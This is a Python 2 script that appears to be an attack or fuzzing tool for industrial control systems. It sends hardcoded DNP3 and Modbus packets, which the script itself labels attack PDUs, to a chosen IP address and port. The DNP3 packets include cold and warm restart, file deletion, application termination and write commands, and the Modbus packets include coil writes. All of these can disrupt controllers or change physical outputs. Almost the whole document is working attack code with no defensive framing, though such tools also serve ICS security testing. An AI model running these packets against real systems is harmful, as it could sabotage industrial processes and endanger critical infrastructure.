#!/usr/bin/python
# -*- coding: UTF-8 -*-
import getopt,sys,optparse
from socket import *
from binascii import hexlify, unhexlify
import time

DEBUG = 1

dnp3_list=[
           "056405c001000004e921",  #dnp3_HealthCheck
           "056408c40a000100fc42c0c00e7edc", #dnp3_WarmRestart
           "056408c40a000100fc42c0c00d9c86", #dnp3_ColdRestart
           "056412c403000400152dc1c10232010701fa7d0b460d01c863", #dnp3_Write
           "056408c401000200390ddece0f32e7", #dnp3_InitData
           "056408c401000200390ddece12f645", #dnp3_AppTermination
           "056408c401000200390ddece1b218c", #dnp3_DeleteFile
           "056405c903000400bd71"            #dnp3_ReadRequest
    ]


modbus_list=[
           "0001000000060a0100000001",  #read coils
           "0001000000060a0300050002",  #read holding reg
           "0001000000060a0500020000", #write signle coil
           "000100000006ff020063001e", #Read discrete Inputs
           "297500000006ff0400300028", #read input registers
           "485a00000008ff0f000700030100", #write multiple coils
           "0001000000060a0100000001",  #read coils
    ]



HOST = "127.0.0.1"
PORT = 502
BUFSIZ = 1024


def usage():
    print(sys.argv[0])
    print(u"""
    -h / --help :help
    -i / --ip :ip address
    -p / --prot :destination port
    -t / --type: attack PDU tye
    -c / --count: how many packets to send in a session 
                  if count > 1, -t / --type would be invalid

    """)
    print_attack_type()


def print_attack_type():
    print(u"""
Defined attack type:
'1: Read Decrete Inputs'
'2: Read Input Registers
    """)


def debug(msg):
    if DEBUG == 1:
        print ("debug: %s" % msg)


def send_pdu_packet(socket, send_list, attack_type = 0, tm = 10):
    global  HOST,BUFSIZ,PORT
 
    print  ("Sending attack packet %s to target %s: %s"%(attack_type, HOST, send_list[(attack_type) -1]))
    socket.sendall(unhexlify(send_list[(attack_type) -1]))

    #get response
    resp = socket.recv(BUFSIZ)
    print("Received attack Response from %s: %s" % (HOST, resp.encode('hex')))

    #time.sleep(tm)
    #str1 = raw_input('any key to continue> ')
 
def debug(msg):
    if DEBUG == 1:
        print ("debug: %s" % msg)

def main(argv):
    global  HOST,BUFSIZ,PORT,modbus_list,dnp3_list
    attack = 1 #packet type
    COUNT=1    #iteration count

    try:
        opts,args = getopt.getopt(sys.argv[1:],"hp:c:i:t:",["help","ip=","port=","type=","count="])

    except getopt.GetoptError:
        usage()
        sys.exit(1)

    for opt, arg in opts:
          if opt in ('-h', "--help"):
             usage()
             sys.exit(1)
          elif opt in ("-i", "--ip"):
             HOST= arg
             print  ("target HOST IP: %s"% HOST)
          elif opt in ("-p", "--port"):
             PORT= arg
             print  ("Destination PORT: %s"% PORT)
          elif opt in ("-c", "--count"):
             COUNT= int(arg)
          elif opt in ("-t", "--type"):
             try:
                 attack= int(arg)
             except: 
                 print ("Attack type %s is NOT recogizable!" % arg)
                 sys.exit(1)

    if (PORT == "502"):
        tranx_list = modbus_list
    if (PORT == "20000"):
        tranx_list = dnp3_list

    if ( (attack > len(tranx_list)) or (attack <= 0) ):
        print ("Attack type %s is out of range [1-%s]!" % (arg, len(tranx_list)))
        sys.exit(1)
           
    print  ("Attack injected type: %s"% attack)
    print  ("Packet number: %s"% COUNT)
    try:
        tcpCliSock = socket(AF_INET, SOCK_STREAM)
    except error, e:
        print  ("create socket failed %s" % e)
        sys.exit(1)
    try:
        tcpCliSock.connect((HOST, int(PORT)))
    except gaierror, e:
        print  ("HOST IP address error: %s" % e)
        sys.exit(1)
    except error, e:
        print  ("Connect to target %s: %s error: %s" % (HOST, PORT, e))
 
    if ( COUNT == 1 ):
        send_pdu_packet(tcpCliSock, tranx_list, attack)
    elif ( COUNT <= 0 ):
        print  ("count %s invalid, should be >=1" % e)
        sys.exit(1)
    else:
        print ("PDU list length: %s" % len(tranx_list))
        cnt=0
        while (cnt < COUNT):
            for idx in range (1, (len(tranx_list)) ):
                print ("list idx: %s" % (idx -1))
                send_pdu_packet(tcpCliSock, tranx_list, idx)
                cnt += 1
                print ("iteration cnt: %s" % (cnt))
                if (cnt >= COUNT):
                    break
                
    str1 = raw_input('any key to continue> ')
    tcpCliSock.close()

if __name__ == "__main__":

    print_attack_type()

    if len(sys.argv) <= 1:  
         usage()
         sys.exit(1)

    main(sys.argv[1:])
